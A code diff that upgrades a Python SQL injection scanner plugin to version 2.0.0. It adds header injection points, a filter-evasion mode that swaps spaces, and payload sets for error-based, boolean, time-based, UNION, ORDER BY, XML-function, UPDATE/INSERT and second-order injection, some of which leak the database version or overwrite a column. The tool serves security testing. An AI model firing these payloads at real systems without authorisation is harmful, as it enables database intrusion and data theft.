@@ -1,4 +1,3 @@
-import asyncio
 import re
 import time
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
@@ -29,6 +28,10 @@ SQL_ERRORS = [
     r"SQLSTATE\[\w+\]",
     r"syntax error.*SQL",
     r"you have an error in your sql",
+    r"XPATH syntax error",
+    r"extractvalue",
+    r"updatexml",
+    r"Duplicate entry.*for key",
 ]
 SQL_ERROR_RE = re.compile("|".join(SQL_ERRORS), re.IGNORECASE)
 
@@ -36,7 +39,7 @@ SQL_ERROR_RE = re.compile("|".join(SQL_ERRORS), re.IGNORECASE)
 class SqlInject(PluginBase):
     meta = PluginMeta(
         name="sql-inject",
-        version="1.0.0",
+        version="2.0.0",
         description="SQL 注入检测",
         category="vuln",
         engine="python",
@@ -47,170 +50,368 @@ class SqlInject(PluginBase):
         method = params.get("method", "GET").upper()
         post_data = params.get("post_data", "").strip()
         cookie = params.get("cookie", "").strip()
+        user_agent = params.get("user_agent", "").strip()
+        referer = params.get("referer", "").strip()
+        xff = params.get("x_forwarded_for", "").strip()
+        trigger_url = params.get("trigger_url", "").strip()
+        space_bypass = params.get("space_bypass", "false").lower() == "true"
         timeout = int(params.get("timeout", 10))
 
         yield PluginEvent(type="log", data={"msg": f"SQL injection scan: {method} {url}"})
-        yield PluginEvent(type="progress", data={"percent": 0, "msg": "Preparing injection points..."})
+        if space_bypass:
+            yield PluginEvent(type="log", data={"msg": "Space bypass mode: ON"})
+        yield PluginEvent(type="progress", data={"percent": 0, "msg": "Preparing..."})
 
-        # Find injection points (marked with *)
-        injection_points = []
+        # ── Collect injection points ──
+        injection_points: list[tuple[str, str]] = []
         if "*" in url:
             injection_points.append(("url", url))
         if "*" in post_data:
             injection_points.append(("body", post_data))
         if "*" in cookie:
             injection_points.append(("cookie", cookie))
+        if "*" in user_agent:
+            injection_points.append(("user-agent", user_agent))
+        if "*" in referer:
+            injection_points.append(("referer", referer))
+        if "*" in xff:
+            injection_points.append(("x-forwarded-for", xff))
 
-        # If no * markers, test all GET params
+        # Auto-detect GET params if no markers
         if not injection_points:
             parsed = urlparse(url)
             qs = parse_qs(parsed.query, keep_blank_values=True)
-            for param_name in qs:
-                marked_qs = dict(qs)
-                marked_qs[param_name] = [qs[param_name][0] + "*"]
-                new_query = urlencode(marked_qs, doseq=True)
+            for pname in qs:
+                mqs = dict(qs)
+                mqs[pname] = [qs[pname][0] + "*"]
+                new_query = urlencode(mqs, doseq=True)
                 new_url = urlunparse(parsed._replace(query=new_query))
                 injection_points.append(("url", new_url))
 
         if not injection_points:
-            yield PluginEvent(type="log", data={"msg": "No injection points found. Use * to mark injection point."})
+            yield PluginEvent(type="log", data={"msg": "No injection points found. Use * to mark."})
             yield PluginEvent(type="progress", data={"percent": 100, "msg": "No injection points"})
             return
 
-        total_tests = len(injection_points) * 5  # 5 test types per point
+        num_tests = 10
+        total = len(injection_points) * num_tests
         done = 0
         found = 0
 
+        ctx = _Ctx(url, post_data, cookie, user_agent, referer, xff)
+
         async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
             for position, target in injection_points:
-                param_name = self._extract_param_name(position, target)
-                yield PluginEvent(type="log", data={"msg": f"\nTesting: {param_name} ({position})"})
+                pname = self._param_name(position, target)
+                yield PluginEvent(type="log", data={"msg": f"\n{'='*50}"})
+                yield PluginEvent(type="log", data={"msg": f"Target: {pname} ({position})"})
 
-                # Get baseline response
-                baseline_url, baseline_body, baseline_cookie = self._build_request(url, post_data, cookie, position, target, "")
+                # Baseline
                 try:
-                    baseline = await self._send(client, method, baseline_url, baseline_body, baseline_cookie)
+                    baseline = await self._fire(client, method, ctx, position, target, "")
                 except Exception as e:
-                    yield PluginEvent(type="log", data={"msg": f"  Baseline request failed: {e}"})
-                    done += 5
+                    yield PluginEvent(type="log", data={"msg": f"  Baseline failed: {e}"})
+                    done += num_tests
                     continue
-                baseline_len = len(baseline.text)
+                bl = len(baseline.text)
 
-                # Test 1: Error-based injection
-                yield PluginEvent(type="log", data={"msg": "  Testing error-based injection..."})
-                for payload in ["'", '"', "\\", "')", "';", "' AND '1'='1"]:
-                    req_url, req_body, req_cookie = self._build_request(url, post_data, cookie, position, target, payload)
+                # Helper closures
+                async def send(payload: str):
+                    return await self._fire(client, method, ctx, position, target, payload)
+
+                def result(typ, payload, evidence):
+                    nonlocal found
+                    found += 1
+                    return PluginEvent(type="result", data={
+                        "param": pname, "position": position,
+                        "type": typ, "payload": payload, "evidence": evidence,
+                    })
+
+                # ── 1. Error-based (basic) ──
+                yield PluginEvent(type="log", data={"msg": "  [1/10] Error-based..."})
+                for p in self._bp(["'", '"', "\\", "')", "';", "1'", "1\""], space_bypass):
                     try:
-                        resp = await self._send(client, method, req_url, req_body, req_cookie)
-                        match = SQL_ERROR_RE.search(resp.text)
-                        if match:
-                            found += 1
-                            yield PluginEvent(type="result", data={
-                                "param": param_name, "position": position,
-                                "type": "Error-based", "payload": payload,
-                                "evidence": match.group()[:100],
-                            })
-                            yield PluginEvent(type="log", data={"msg": f"  [VULN] Error-based: {payload}"})
+                        r = await send(p)
+                        m = SQL_ERROR_RE.search(r.text)
+                        if m:
+                            yield result("Error-based", p, m.group()[:120])
+                            yield PluginEvent(type="log", data={"msg": f"  [VULN] Error-based: {p}"})
                             break
                     except Exception:
                         pass
                 done += 1
 
-                # Test 2: Boolean-based blind
-                yield PluginEvent(type="log", data={"msg": "  Testing boolean-based blind..."})
-                for true_p, false_p in [("' OR '1'='1", "' OR '1'='2"), ("1 OR 1=1", "1 OR 1=2"), ("' OR 1=1--", "' OR 1=2--")]:
-                    try:
-                        url_t, body_t, cookie_t = self._build_request(url, post_data, cookie, position, target, true_p)
-                        url_f, body_f, cookie_f = self._build_request(url, post_data, cookie, position, target, false_p)
-                        resp_t = await self._send(client, method, url_t, body_t, cookie_t)
-                        resp_f = await self._send(client, method, url_f, body_f, cookie_f)
-                        diff = abs(len(resp_t.text) - len(resp_f.text))
-                        if diff > 50 and abs(len(resp_t.text) - baseline_len) > 50:
-                            found += 1
-                            yield PluginEvent(type="result", data={
-                                "param": param_name, "position": position,
-                                "type": "Boolean blind", "payload": true_p,
-                                "evidence": f"True/False response diff: {diff} chars",
-                            })
-                            yield PluginEvent(type="log", data={"msg": f"  [VULN] Boolean blind: diff={diff}"})
-                            break
-                    except Exception:
-                        pass
+                # ── 2. Integer / AND-OR ──
+                yield PluginEvent(type="log", data={"msg": "  [2/10] Integer AND/OR..."})
+                and_or_pairs = [
+                    ("1 AND 1=1", "1 AND 1=2", "Integer (AND)"),
+                    ("1 OR 1=1", "1 OR 1=2", "Integer (OR)"),
+                    ("-1 OR 1=1", "-1 OR 1=2", "Integer (OR neg)"),
+                    ("1 AND 1=1#", "1 AND 1=2#", "AND (hash comment)"),
+                    ("1 AND 1=1-- ", "1 AND 1=2-- ", "AND (dash comment)"),
+                ]
+                for tp, fp, label in and_or_pairs:
+                    for t, f in zip(self._bp([tp], space_bypass), self._bp([fp], space_bypass)):
+                        try:
+                            rt = await send(t)
+                            rf = await send(f)
+                            diff = abs(len(rt.text) - len(rf.text))
+                            if diff > 50:
+                                yield result(label, f"{t} / {f}",
+                                             f"True={len(rt.text)} False={len(rf.text)} diff={diff}")
+                                yield PluginEvent(type="log", data={"msg": f"  [VULN] {label}: diff={diff}"})
+                                break
+                        except Exception:
+                            pass
+                    else:
+                        continue
+                    break
                 done += 1
 
-                # Test 3: Time-based blind
-                yield PluginEvent(type="log", data={"msg": "  Testing time-based blind..."})
-                for payload in ["' OR SLEEP(3)--", "1; WAITFOR DELAY '0:0:3'--", "' OR pg_sleep(3)--"]:
+                # ── 3. String / Boolean blind ──
+                yield PluginEvent(type="log", data={"msg": "  [3/10] String Boolean blind..."})
+                str_pairs = [
+                    ("' OR '1'='1", "' OR '1'='2"),
+                    ("' OR 1=1-- ", "' OR 1=2-- "),
+                    ("' OR 1=1#", "' OR 1=2#"),
+                    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
+                    ("') OR ('1'='1", "') OR ('1'='2"),
+                    ("') OR 1=1-- ", "') OR 1=2-- "),
+                ]
+                for tp, fp in str_pairs:
+                    for t, f in zip(self._bp([tp], space_bypass), self._bp([fp], space_bypass)):
+                        try:
+                            rt = await send(t)
+                            rf = await send(f)
+                            diff = abs(len(rt.text) - len(rf.text))
+                            if diff > 50:
+                                yield result("String (Boolean blind)", f"{t} / {f}",
+                                             f"True={len(rt.text)} False={len(rf.text)} diff={diff}")
+                                yield PluginEvent(type="log", data={"msg": f"  [VULN] Boolean blind: diff={diff}"})
+                                break
+                        except Exception:
+                            pass
+                    else:
+                        continue
+                    break
+                done += 1
+
+                # ── 4. Time-based blind ──
+                yield PluginEvent(type="log", data={"msg": "  [4/10] Time-based blind..."})
+                time_payloads = [
+                    "1 AND SLEEP(3)-- ",
+                    "' AND SLEEP(3)-- ",
+                    "' AND SLEEP(3)#",
+                    "1) AND SLEEP(3)-- ",
+                    "') AND SLEEP(3)-- ",
+                    "1;WAITFOR DELAY '0:0:3'-- ",
+                    "' OR pg_sleep(3)-- ",
+                ]
+                for p in self._bp(time_payloads, space_bypass):
                     try:
-                        req_url, req_body, req_cookie = self._build_request(url, post_data, cookie, position, target, payload)
                         t0 = time.monotonic()
-                        await self._send(client, method, req_url, req_body, req_cookie)
+                        await send(p)
                         elapsed = time.monotonic() - t0
                         if elapsed >= 2.5:
-                            found += 1
-                            yield PluginEvent(type="result", data={
-                                "param": param_name, "position": position,
-                                "type": "Time blind", "payload": payload,
-                                "evidence": f"Response delayed {elapsed:.1f}s",
-                            })
-                            yield PluginEvent(type="log", data={"msg": f"  [VULN] Time blind: {elapsed:.1f}s delay"})
+                            yield result("Time blind", p, f"Delayed {elapsed:.1f}s")
+                            yield PluginEvent(type="log", data={"msg": f"  [VULN] Time blind: {elapsed:.1f}s"})
                             break
                     except Exception:
                         pass
                 done += 1
 
-                # Test 4: Integer injection
-                yield PluginEvent(type="log", data={"msg": "  Testing integer injection..."})
-                for payload in ["1 AND 1=1", "1 AND 1=2"]:
+                # ── 5. UNION injection ──
+                yield PluginEvent(type="log", data={"msg": "  [5/10] UNION injection..."})
+                union_hit = False
+                for cols in range(1, 16):
+                    nulls = ",".join(["NULL"] * cols)
+                    candidates = [
+                        f"' UNION SELECT {nulls}-- ",
+                        f"' UNION SELECT {nulls}#",
+                        f" UNION SELECT {nulls}-- ",
+                        f"') UNION SELECT {nulls}-- ",
+                        f"\" UNION SELECT {nulls}-- ",
+                    ]
+                    for p in self._bp(candidates, space_bypass):
+                        try:
+                            r = await send(p)
+                            if r.status_code == 200 and not SQL_ERROR_RE.search(r.text):
+                                if abs(len(r.text) - bl) > 10:
+                                    yield result("UNION injection", p, f"{cols} columns")
+                                    yield PluginEvent(type="log", data={"msg": f"  [VULN] UNION: {cols} cols"})
+                                    union_hit = True
+                                    break
+                        except Exception:
+                            pass
+                    if union_hit:
+                        break
+                done += 1
+
+                # ── 6. ORDER BY injection ──
+                yield PluginEvent(type="log", data={"msg": "  [6/10] ORDER BY injection..."})
+                ob_pairs = [
+                    ("1 ORDER BY 1-- ", "1 ORDER BY 9999-- "),
+                    ("' ORDER BY 1-- ", "' ORDER BY 9999-- "),
+                    ("' ORDER BY 1#", "' ORDER BY 9999#"),
+                    ("') ORDER BY 1-- ", "') ORDER BY 9999-- "),
+                ]
+                for low, high in ob_pairs:
+                    for l, h in zip(self._bp([low], space_bypass), self._bp([high], space_bypass)):
+                        try:
+                            rl = await send(l)
+                            rh = await send(h)
+                            low_ok = rl.status_code == 200 and not SQL_ERROR_RE.search(rl.text)
+                            high_err = SQL_ERROR_RE.search(rh.text) or rh.status_code != 200
+                            if low_ok and high_err:
+                                yield result("ORDER BY injection", f"{l} / {h}",
+                                             "ORDER BY 1 OK, ORDER BY 9999 error")
+                                yield PluginEvent(type="log", data={"msg": "  [VULN] ORDER BY injection"})
+                                break
+                        except Exception:
+                            pass
+                    else:
+                        continue
+                    break
+                done += 1
+
+                # ── 7. Error-based (extractvalue / updatexml) ──
+                yield PluginEvent(type="log", data={"msg": "  [7/10] Error-based (XML functions)..."})
+                xml_payloads = [
+                    "' AND extractvalue(1,concat(0x7e,version()))-- ",
+                    "' AND updatexml(1,concat(0x7e,version()),1)-- ",
+                    "1 AND extractvalue(1,concat(0x7e,version()))-- ",
+                    "1 AND updatexml(1,concat(0x7e,version()),1)-- ",
+                    "' AND extractvalue(1,concat(0x7e,version()))#",
+                    "') AND extractvalue(1,concat(0x7e,version()))-- ",
+                ]
+                for p in self._bp(xml_payloads, space_bypass):
                     try:
-                        req_url, req_body, req_cookie = self._build_request(url, post_data, cookie, position, target, payload)
-                        resp = await self._send(client, method, req_url, req_body, req_cookie)
-                        if payload.endswith("1=1") and abs(len(resp.text) - baseline_len) < 50:
-                            # True condition matches baseline, now check false
-                            req_url2, req_body2, req_cookie2 = self._build_request(url, post_data, cookie, position, target, "1 AND 1=2")
-                            resp2 = await self._send(client, method, req_url2, req_body2, req_cookie2)
-                            if abs(len(resp2.text) - baseline_len) > 50:
-                                found += 1
-                                yield PluginEvent(type="result", data={
-                                    "param": param_name, "position": position,
-                                    "type": "Integer injection", "payload": "1 AND 1=1 / 1 AND 1=2",
-                                    "evidence": f"True={len(resp.text)}, False={len(resp2.text)}, Baseline={baseline_len}",
-                                })
-                                yield PluginEvent(type="log", data={"msg": "  [VULN] Integer injection detected"})
+                        r = await send(p)
+                        leak = re.search(r"~([\w.\-]+)", r.text)
+                        if leak:
+                            yield result("Error-based (XML)", p, f"Leaked: {leak.group()}")
+                            yield PluginEvent(type="log", data={"msg": f"  [VULN] XML error: {leak.group()}"})
+                            break
+                        m = SQL_ERROR_RE.search(r.text)
+                        if m:
+                            yield result("Error-based (XML)", p, m.group()[:120])
+                            yield PluginEvent(type="log", data={"msg": "  [VULN] XML error injection"})
                             break
                     except Exception:
                         pass
                 done += 1
 
-                # Test 5: UNION injection probe
-                yield PluginEvent(type="log", data={"msg": "  Testing UNION injection..."})
-                for cols in range(1, 11):
-                    null_list = ",".join(["NULL"] * cols)
-                    payload = f"' UNION SELECT {null_list}--"
+                # ── 8. UPDATE context ──
+                yield PluginEvent(type="log", data={"msg": "  [8/10] UPDATE context..."})
+                update_payloads = [
+                    "' AND SLEEP(3) AND '1'='1",
+                    "'+SLEEP(3)+'",
+                    "' AND extractvalue(1,concat(0x7e,version())) AND '1'='1",
+                    "' WHERE 1=1 AND SLEEP(3)-- ",
+                    "',username=(SELECT version()) WHERE '1'='1",
+                ]
+                for p in self._bp(update_payloads, space_bypass):
                     try:
-                        req_url, req_body, req_cookie = self._build_request(url, post_data, cookie, position, target, payload)
-                        resp = await self._send(client, method, req_url, req_body, req_cookie)
-                        if not SQL_ERROR_RE.search(resp.text) and resp.status_code == 200:
-                            found += 1
-                            yield PluginEvent(type="result", data={
-                                "param": param_name, "position": position,
-                                "type": "UNION injection", "payload": payload,
-                                "evidence": f"UNION with {cols} columns succeeded",
-                            })
-                            yield PluginEvent(type="log", data={"msg": f"  [VULN] UNION injection: {cols} columns"})
+                        t0 = time.monotonic()
+                        r = await send(p)
+                        elapsed = time.monotonic() - t0
+                        if elapsed >= 2.5:
+                            yield result("UPDATE context (time)", p, f"Delayed {elapsed:.1f}s in SET")
+                            yield PluginEvent(type="log", data={"msg": f"  [VULN] UPDATE time: {elapsed:.1f}s"})
+                            break
+                        leak = re.search(r"~([\w.\-]+)", r.text)
+                        if leak:
+                            yield result("UPDATE context (error)", p, f"Leaked: {leak.group()}")
+                            yield PluginEvent(type="log", data={"msg": f"  [VULN] UPDATE error: {leak.group()}"})
                             break
                     except Exception:
                         pass
                 done += 1
 
-                pct = min(done * 100 // max(total_tests, 1), 99)
-                yield PluginEvent(type="progress", data={"percent": pct, "msg": f"Tested {done}/{total_tests}"})
+                # ── 9. INSERT context ──
+                yield PluginEvent(type="log", data={"msg": "  [9/10] INSERT context..."})
+                insert_payloads = [
+                    "' AND SLEEP(3))-- ",
+                    "',SLEEP(3))-- ",
+                    "' AND extractvalue(1,concat(0x7e,version())))-- ",
+                    "')-- ",
+                    "','','')-- ",
+                ]
+                for p in self._bp(insert_payloads, space_bypass):
+                    try:
+                        t0 = time.monotonic()
+                        r = await send(p)
+                        elapsed = time.monotonic() - t0
+                        if elapsed >= 2.5:
+                            yield result("INSERT context (time)", p, f"Delayed {elapsed:.1f}s in VALUES")
+                            yield PluginEvent(type="log", data={"msg": f"  [VULN] INSERT time: {elapsed:.1f}s"})
+                            break
+                        leak = re.search(r"~([\w.\-]+)", r.text)
+                        if leak:
+                            yield result("INSERT context (error)", p, f"Leaked: {leak.group()}")
+                            yield PluginEvent(type="log", data={"msg": f"  [VULN] INSERT error: {leak.group()}"})
+                            break
+                        m = SQL_ERROR_RE.search(r.text)
+                        if m and any(k in p for k in [")", "',", "extractvalue"]):
+                            yield result("INSERT context (error)", p, m.group()[:120])
+                            yield PluginEvent(type="log", data={"msg": "  [VULN] INSERT error injection"})
+                            break
+                    except Exception:
+                        pass
+                done += 1
 
-        summary = f"Scan complete: {found} injection points found"
-        yield PluginEvent(type="log", data={"msg": summary})
+                # ── 10. Second-order injection ──
+                if trigger_url:
+                    yield PluginEvent(type="log", data={"msg": "  [10/10] Second-order injection..."})
+                    try:
+                        trig_base = await client.request("GET", trigger_url)
+                        trig_bl = len(trig_base.text)
+                    except Exception:
+                        trig_bl = 0
+                    second_payloads = [
+                        "admin'-- ",
+                        "' OR 1=1-- ",
+                        "' UNION SELECT 1,2,3-- ",
+                        "\" OR \"\"=\"",
+                    ]
+                    for p in second_payloads:
+                        try:
+                            await send(p)
+                            tr = await client.request("GET", trigger_url)
+                            diff = abs(len(tr.text) - trig_bl)
+                            err = SQL_ERROR_RE.search(tr.text)
+                            if diff > 100 or err:
+                                ev = f"SQL error in trigger: {err.group()[:80]}" if err else f"Trigger diff={diff}"
+                                yield result("Second-order injection", p, ev)
+                                yield PluginEvent(type="log", data={"msg": f"  [VULN] Second-order: {ev}"})
+                                break
+                        except Exception:
+                            pass
+                else:
+                    yield PluginEvent(type="log", data={"msg": "  [10/10] Second-order: skipped (no trigger_url)"})
+                done += 1
+
+                pct = min(done * 100 // max(total, 1), 99)
+                yield PluginEvent(type="progress", data={"percent": pct, "msg": f"Tested {done}/{total}"})
+
+        summary = f"Scan complete: {found} vulnerabilities found across {len(injection_points)} points"
+        yield PluginEvent(type="log", data={"msg": f"\n{summary}"})
         yield PluginEvent(type="progress", data={"percent": 100, "msg": summary})
 
-    def _extract_param_name(self, position: str, target: str) -> str:
+    # ── Helpers ──
+
+    def _bp(self, payloads: list[str], bypass: bool) -> list[str]:
+        """Generate space-bypass variants."""
+        if not bypass:
+            return payloads
+        out = list(payloads)
+        for p in payloads:
+            if " " in p:
+                for rep in ["/**/", "%09", "%0a", "+"]:
+                    out.append(p.replace(" ", rep))
+        return out
+
+    def _param_name(self, position: str, target: str) -> str:
         if position == "url":
             parsed = urlparse(target)
             qs = parse_qs(parsed.query, keep_blank_values=True)
@@ -226,25 +427,52 @@ class SqlInject(PluginBase):
             for pair in target.split(";"):
                 if "*" in pair and "=" in pair:
                     return pair.split("=")[0].strip()
+        elif position in ("user-agent", "referer", "x-forwarded-for"):
+            return position.upper()
         return position
 
-    def _build_request(self, url, post_data, cookie, position, target, payload):
-        """Replace * marker with payload in the correct position."""
-        req_url = url.replace("*", "") if "*" in url else url
-        req_body = post_data.replace("*", "") if post_data else None
-        req_cookie = cookie.replace("*", "") if cookie else None
+    def _build(self, ctx, position, target, payload):
+        """Build (url, body, headers) with payload injected at position."""
+        req_url = ctx.url.replace("*", "") if "*" in ctx.url else ctx.url
+        req_body = ctx.post_data.replace("*", "") if ctx.post_data else None
+        headers: dict[str, str] = {}
+        if ctx.cookie:
+            headers["Cookie"] = ctx.cookie.replace("*", "")
+        if ctx.user_agent:
+            headers["User-Agent"] = ctx.user_agent.replace("*", "")
+        if ctx.referer:
+            headers["Referer"] = ctx.referer.replace("*", "")
+        if ctx.xff:
+            headers["X-Forwarded-For"] = ctx.xff.replace("*", "")
 
         if position == "url":
             req_url = target.replace("*", payload)
         elif position == "body":
             req_body = target.replace("*", payload)
         elif position == "cookie":
-            req_cookie = target.replace("*", payload)
+            headers["Cookie"] = target.replace("*", payload)
+        elif position == "user-agent":
+            headers["User-Agent"] = target.replace("*", payload)
+        elif position == "referer":
+            headers["Referer"] = target.replace("*", payload)
+        elif position == "x-forwarded-for":
+            headers["X-Forwarded-For"] = target.replace("*", payload)
 
-        return req_url, req_body, req_cookie
+        return req_url, req_body, headers
 
-    async def _send(self, client, method, url, body, cookie):
-        headers = {}
-        if cookie:
-            headers["Cookie"] = cookie
-        return await client.request(method, url, content=body, headers=headers)
+    async def _fire(self, client, method, ctx, position, target, payload):
+        req_url, req_body, headers = self._build(ctx, position, target, payload)
+        return await client.request(method, req_url, content=req_body, headers=headers)
+
+
+class _Ctx:
+    """Simple container for base request parameters."""
+    __slots__ = ("url", "post_data", "cookie", "user_agent", "referer", "xff")
+
+    def __init__(self, url, post_data, cookie, user_agent, referer, xff):
+        self.url = url
+        self.post_data = post_data
+        self.cookie = cookie
+        self.user_agent = user_agent
+        self.referer = referer
+        self.xff = xff
